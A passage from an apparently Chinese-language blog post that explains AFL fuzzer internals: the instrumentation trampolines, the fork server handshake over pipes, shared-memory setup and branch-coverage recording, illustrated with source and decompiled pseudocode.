[rsp+98h]</span><br></pre></td></tr></table></figure><p>阅读<code>afl-as.c</code>发现插桩完成在 <code>add_instrumentation</code>函数内部</p><blockquote><p><code>fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</code></p></blockquote><p>这里 afl 通过调用 fprintf 将 trampoline_fmt_64 或者 trampoline_fmt_32 插入目标的代码段，以完成插桩来计算代码覆盖率。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-as.h</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal -16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edi,  0(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edx,  4(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%ecx,  8(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%eax, 12(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl $0x%08x, %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl 12(%%esp), %%eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  8(%%esp), %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  4(%%esp), %%edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  0(%%esp), %%edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal 16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到插桩主要完成了（x64）：</p><ul><li>保存<code>rax</code> <code>rcx</code> <code>rdx</code> 等寄存器的值</li><li>将<code>ecx</code>的值设置为随机数</li><li>调用<code>__afl_maybe_log</code></li><li>恢复原寄存器的数据</li></ul><p>关于<code>&quot;movq $0x%08x, %%rcx\n&quot;</code>这条汇编代码其对应<code>fprintf</code>中的参数为<code>R(MAP_SIZE)</code>，根据定义，宏<code>MAP_SIZE</code>为64K；<code>R(x)</code>的定义是<code>(random() % (x))</code>，所以<code>R(MAP_SIZE)</code>即为0到MAP_SIZE之间的一个随机数。这里的R(x)实际上是用来区分每个代码块的，也就是是一个标识。</p><p>关于<code>__afl_maybe_log()</code>的详细实现会在下文提及。</p><h1 id="fork-server"><a href="#fork-server" class="headerlink" title="fork server"></a>fork server</h1><p>afl 的流程大致是：对输入的样本文件不断地变异，并将这些 mutated input 喂给 loader 执行，检查是否会造成崩溃。因此，fuzzing 涉及到大量的 fork 和执行 loader 的过程。但是对于简单的库，我们会花费大量时间去等待<code>execve()</code>，载入目标文件和库、解析符号地址等，为了避免这种情况，AFL实现了一套 fork server 机制。其基本思路是：启动target进程后，target会运行一个fork server；fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作。</p><h2 id="init-fork-server"><a href="#init-fork-server" class="headerlink" title="init fork server"></a>init fork server</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">init_forkserver</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">it</span>;</span></span><br><span class="line">  <span class="keyword">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>]; <span class="comment">//建立管道st_pipe和ctl_pipe，在父子进程之间，是通过管道进行通信，一个用于传递状态，另一个用于传递命令。</span></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  forksrv_pid = fork();        <span class="comment">//fork 出来一个子进程，父子进程之间通过管道进行通信。</span></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  <span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/* Set up control and status pipes, close the unneeded original fds. */</span></span><br><span class="line">    <span class="keyword">if</span> (dup2(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);    <span class="comment">//对于子进程（fork server），会进行一系列设置，其中包括将上述两个管道分配到预先指定的fd，并最终执行target：</span></span><br><span class="line">    <span class="keyword">if</span> (dup2(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line">...</span><br><span class="line">    execv(target_path, argv);</span><br><span class="line">    <span class="comment">/* Use a distinctive bitmap signature to tell the parent about execv() falling through. */</span></span><br><span class="line">    *(u32*)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//对于父进程（fuzzer），则会读取状态管道的信息，如果一切正常，则说明fork server创建完成。</span></span><br><span class="line">  close(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">  close(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">  fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  rlen = read(fsrv_st_fd, &amp;status, <span class="number">4</span>);  <span class="comment">//从管道中读取4个字节</span></span><br><span class="line">  ...</span><br><span class="line">     <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    OKF(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Fork server handshake failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>execv(target_path, argv)</code>带参数执行target，这个函数除非出错不然不会返回。</p><ul><li>execv会替换掉原有的进程空间为target_path代表的程序，所以相当于后续就是去执行target_path，这个程序结束的话，子进程就结束。</li><li><strong>此时由于我们的目标程序的 main 函数已经被插桩，程序的控制流会交到<code>_afl_maybe_log</code>手中。所以关于 fork server 的其余工作都在<code>_afl_maybe_log</code>中完成。而在这里非常特殊，第一个target会进入<code>__afl_maybe_log</code>里的<code>__afl_fork_wait_loop</code>，并充当fork server，在整个Fuzz的过程中，它都不会结束，每次要Fuzz一次target，都会从这个fork server fork出来一个子进程去fuzz。</strong></li></ul><h2 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log()"></a>__afl_maybe_log()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __usercall _afl_maybe_log@&lt;al&gt;(<span class="keyword">char</span> a1@&lt;of&gt;, __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;xmm0&gt;, __int64 a4@&lt;xmm1&gt;, __int64 a5@&lt;xmm2&gt;, __int64 a6@&lt;xmm3&gt;, __int64 a7@&lt;xmm4&gt;, __int64 a8@&lt;xmm5&gt;, __int64 a9@&lt;xmm6&gt;, __int64 a10@&lt;xmm7&gt;, __int64 a11@&lt;xmm8&gt;, __int64 a12@&lt;xmm9&gt;, __int64 a13@&lt;xmm10&gt;, __int64 a14@&lt;xmm11&gt;, __int64 a15@&lt;xmm12&gt;, __int64 a16@&lt;xmm13&gt;, __int64 a17@&lt;xmm14&gt;, __int64 a18@&lt;xmm15&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  v19 = _afl_area_ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !_afl_area_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_setup_failure )</span><br><span class="line">      <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">    v19 = _afl_global_area_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_global_area_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      _afl_area_ptr = _afl_global_area_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      v22 = getenv(<span class="string">&quot;__AFL_SHM_ID&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v22 || (v23 = atoi(v22), v24 = shmat(v23, <span class="number">0L</span>L, <span class="number">0</span>), v24 == (<span class="keyword">void</span> *)<span class="number">-1L</span>L) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v18 = v29;</span><br><span class="line">        <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _afl_area_ptr = (__int64)v24;</span><br><span class="line">      _afl_global_area_ptr = v24;</span><br><span class="line">      v28 = (__int64)v24;</span><br><span class="line">      <span class="keyword">if</span> ( write(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4u</span>LL) == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = <span class="number">198</span>;</span><br><span class="line">          <span class="keyword">if</span> ( read(<span class="number">198</span>, &amp;_afl_temp, <span class="number">4u</span>LL) != <span class="number">4</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          LODWORD(v26) = fork();</span><br><span class="line">          <span class="keyword">if</span> ( v26 &lt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v26 )</span><br><span class="line">            <span class="keyword">goto</span> __afl_fork_resume;</span><br><span class="line">          _afl_fork_pid = v26;</span><br><span class="line">          write(<span class="number">199</span>, &amp;_afl_fork_pid, <span class="number">4u</span>LL);</span><br><span class="line">          v25 = _afl_fork_pid;</span><br><span class="line">          LODWORD(v27) = waitpid(_afl_fork_pid, &amp;_afl_temp, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v27 &lt;= <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          write(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        _exit(v25);</span><br><span class="line">      &#125;</span><br><span class="line">__afl_fork_resume:</span><br><span class="line">      close(<span class="number">198</span>);</span><br><span class="line">      close(<span class="number">199</span>);</span><br><span class="line">      v19 = v28;</span><br><span class="line">      v18 = v29;</span><br><span class="line">      a2 = v30;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v20 = _afl_prev_loc ^ a2;</span><br><span class="line">  _afl_prev_loc ^= v20;</span><br><span class="line">  _afl_prev_loc = (<span class="keyword">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  ++*(_BYTE *)(v19 + v20);</span><br><span class="line">  <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读伪代码或者汇编，可以总结其工作流程如下：</p><ol><li><p>先判断是否设置了共享内存，如果没设置则判断<code>_afl_setup_failure</code>是否为真，如果为真，则代表setup失败，直接返回。也就是说只有第一次执行<code>__afl_maybe_log()</code>的时候，才会进入该 if 语句。</p><ul><li>如果初始化失败则直接返回</li><li>初始化成功后，读取<code>_afl_global_area_ptr</code>的值，不为 0 ，则赋值给 <code>_afl_area_ptr</code></li><li><code>_afl_global_area_ptr</code>为 0， 则把共享内存连接到当前进程的地址空间，将得到的地址，保存到<code>_afl_area_ptr</code>和<code>_afl_global_area_ptr</code>中。</li><li><code>write(199, &amp;_afl_temp, 4uLL) == 4</code>写4个字节到状态管道<code>st_pipe[0]</code>，forkserver 告诉 fuzzer 自己准备好了，而这正好是<code>rlen = read(fsrv_st_fd, &amp;status, 4);</code>中等待的信息。<ul><li><code>read(198, &amp;_afl_temp, 4uLL) != 4</code>forkserver 再从管道中读取 4 个字节，这时候表示 fuzzer 也准备好了。这时候 fork 出一个新的子进程，用来跑 target，而原本的父进程则用来通信。</li><li><code>write(199, &amp;_afl_fork_pid, 4uLL);</code>将子进程的 pid 写进管道，以为<code>fuzzer</code>的监控。</li><li>然后父进程即fork server等待子进程结束，并保存其执行结果到<code>_afl_temp</code>中，然后将子进程的执行结果，从<code>_afl_temp</code>写入到状态管道，告知fuzz。</li><li>父进程不断执行<code>__afl_fork_wait_loop</code>循环，不断从控制管道读取，直到fuzz端命令fork server进行新一轮测试。</li></ul></li></ul></li><li><p>如果共享内存已经被设置，则直接进入<code>__afl_store</code>逻辑，看伪代码可以知道：就是将上一个桩点的值(prev_location)和当前桩点的值(<code>R(MAP_SIZE)</code>)异或，取值后，使得<strong>共享内存里对应的槽</strong>的值加一，然后将prev_location设置为<code>cur_location &gt;&gt; 1;</code>。其余内容我们在下文分析。</p></li></ol><p>在fork server执行完毕后，当我们运行<code>target</code>的时候，fuzzer会调用<code>run_target()</code>，在此方法中，便是通过命令管道，通知fork server准备fork；并通过状态管道，获取子进程pid：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line">s32 res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In non-dumb mode, we have the fork server up and running, so simply tell it to have at it, and then read back PID. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;status, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">/*fuzzer再次读取状态管道，获取子进程退出状态，并由此来判断子进程结束的原因，例如正常退出、超时、崩溃等，并进行相应的记录。. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;</span><br><span class="line"></span><br><span class="line">    kill_signal = WTERMSIG(status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL) <span class="keyword">return</span> FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>简介来说整个 server 流程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210413092653.png" alt="image-20210413092646310"></p><blockquote><p>afl 在初始化 forkserver 的时候会创建两个管道，fork 后通过 execve 去执行 target，因为目标程序的 main 函数已经被插桩，程序的控制流会交到_afl_maybe_log手中。如果 fuzz 实例是第一次运行，则此子进程则会充当 fuzz server，之后的程序都是由该 server fork出来的子进程。fuzz进行的时候，fuzz server会一直fork子进程，并且将子进程的结束状态通过pipe传递给afl-fuzz。</p></blockquote><h1 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h1><p>我们知道AFL 是以无限 fork 的形式进行 fuzzing 的，那么可以了解到 fuzzer 和 target 直接信息是要共享的，比如：执行过程中的分支信息；随后，fuzzer便可以根据这些信息，判断这次执行的整体流程和代码覆盖情况。</p><p>AFL使用共享内存，来完成以上信息在fuzzer和target之间的传递。具体地，fuzzer在启动时，会执行<code>setup_shm()</code>方法进行配置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_shm</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* shm_str;</span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    </span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  ck_free(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!trace_bits) PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>shmget()：用来创建共享内存</p><p>shmat() ：第一次创建完共享内存时，它还不能被任何进程访问，shmat()函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间</p></blockquote><ul><li><p>首先调用<code>shemget()</code>分配一块共享内存，大小<code>MAP_SIZE</code>为64K</p></li><li><p>分配成功后，该共享内存的标志符会通过<code>setenv</code>设置到环境变量中，从而之后<code>fork()</code>得到的子进程可以通过该环境变量，得到这块共享内存的标志符</p></li><li><p>fuzzer 则会通过 <code>trace_bits</code> 来保存共享内存的地址</p></li><li><p>每次 fuzzer 去运行 target 的时候都会初始化共享内存</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">run_target</span><span class="params">(<span class="keyword">char</span>** argv, u32 timeout)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">  MEM_BARRIER();</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>而在 forkserver 内部</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char __usercall _afl_maybe_log@&lt;al&gt;(char a1@&lt;of&gt;, __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;xmm0&gt;, __int64 a4@&lt;xmm1&gt;, __int64 a5@&lt;xmm2&gt;, __int64 a6@&lt;xmm3&gt;, __int64 a7@&lt;xmm4&gt;, __int64 a8@&lt;xmm5&gt;, __int64 a9@&lt;xmm6&gt;, __int64 a10@&lt;xmm7&gt;, __int64 a11@&lt;xmm8&gt;, __int64 a12@&lt;xmm9&gt;, __int64 a13@&lt;xmm10&gt;, __int64 a14@&lt;xmm11&gt;, __int64 a15@&lt;xmm12&gt;, __int64 a16@&lt;xmm13&gt;, __int64 a17@&lt;xmm14&gt;, __int64 a18@&lt;xmm15&gt;)</span><br><span class="line">&#123;</span><br><span class="line">      ...</span><br><span class="line">      v22 &#x3D; getenv(&quot;__AFL_SHM_ID&quot;);</span><br><span class="line">      if ( !v22 || (v23 &#x3D; atoi(v22), v24 &#x3D; shmat(v23, 0LL, 0), v24 &#x3D;&#x3D; (void *)-1LL) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v18 &#x3D; v29;</span><br><span class="line">        return v18 + 127;</span><br><span class="line">      &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  则会先判断共享内存是否被设置，然后通过调用<code>shmat()</code>，target将这块共享内存也映射到了自己的内存空间中，并将其地址保存在<code>__afl_area_ptr</code>及<code>edx</code>中。由此，便完成了fuzzer与target之间共享内存的设置。</p></li></ul><h1 id="分支信息的记录"><a href="#分支信息的记录" class="headerlink" title="分支信息的记录"></a>分支信息的记录</h1><p>由官网文档可知，AFL 是根据二元 tuple (跳转的源地址和目标地址)来记录分支信息，从而获取 target 的执行流程和代码覆盖情况，其伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400</span>CB0 __afl_store:                            ; CODE XREF: __afl_maybe_log+<span class="number">4F</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400</span>CB0                                         ; __afl_maybe_log+<span class="number">309</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400</span>CB0                 <span class="keyword">xor</span>     rcx, cs:__afl_prev_loc</span><br><span class="line">.text:<span class="number">0000000000400</span>CB7                 <span class="keyword">xor</span>     cs:__afl_prev_loc, rcx</span><br><span class="line">.text:<span class="number">0000000000400</span>CBE                 shr     cs:__afl_prev_loc, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400</span>CC5                 inc     byte ptr [rdx+rcx]</span><br><span class="line">    </span><br><span class="line">v20 = _afl_prev_loc ^ a2;</span><br><span class="line">_afl_prev_loc ^= v20;</span><br><span class="line"> _afl_prev_loc = (<span class="keyword">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span 